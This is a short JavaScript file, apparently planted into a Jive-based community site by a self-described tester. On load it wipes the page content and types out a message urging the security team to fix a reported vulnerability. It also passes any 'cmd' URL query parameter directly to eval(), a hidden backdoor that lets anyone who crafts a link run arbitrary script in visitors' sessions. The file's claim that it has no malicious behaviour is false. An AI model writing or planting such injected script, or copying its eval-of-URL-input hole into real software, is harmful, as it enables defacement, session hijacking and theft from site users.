//Just for testing
//By kev7n

var i = 0;
var showString = "Hi There,|"
    + "|"
    + "If you see this page, it means that the NEO has a security vulnerability.|"
    + "Please DO NOT worry, this won't have any malicious behavior, just a test.|"
    + "It is a very high risk level of vulnerability, I have reported to Security Team five days ago.|"
    + "This page is just to get the security team to pay enough attention to. Please fix it ASAP.|"
    + "|"
    + "Have a good day.|"
    + "|"
    + "By Kevin|"
    + "|";

function marquee() {
    var stringLength = showString.length;
    var eInput = document.getElementById('input');
    if(showString.charAt(i) === '|') {
        var br = document.createElement("br");
        eInput.appendChild(br);
    }else{
        eInput.innerHTML += showString.charAt(i);
    }
    i++;
    var timeID = setTimeout("marquee()", 70);
    if (i >= stringLength) {
        clearTimeout(timeID);
        i = 0;
        var cp = document.createElement("span");
        cp.style.color = 'white';
        var queryString = document.location.search.substr(1);
        cp.innerHTML = "Click <a href= \'" + document.location.origin + document.location.pathname + "?" + queryString + "&view=normal\'><b>here</b></a> to visit normal page.";
        eInput.appendChild(cp);
    }
}

function getParameterByName(name) {
    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
        results = regex.exec(location.search);
    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

var cmd = getParameterByName('cmd');
if (!!cmd) {
    //var cmdCode = decodeURIComponent(queryString);
    eval(cmd);
} else {
    var nView  =  getParameterByName('view');
    if (!!nView) {
        //Do nothing.
    }else{
        var body = document.getElementsByClassName('jive-body-content')[0];
        body.innerHTML = '';
        body.style.background = 'black';
        body.innerHTML = '<br/><span id=\'input\' style=\'color:rgb(70, 221, 70);\'></span>';
        marquee();
    }
}
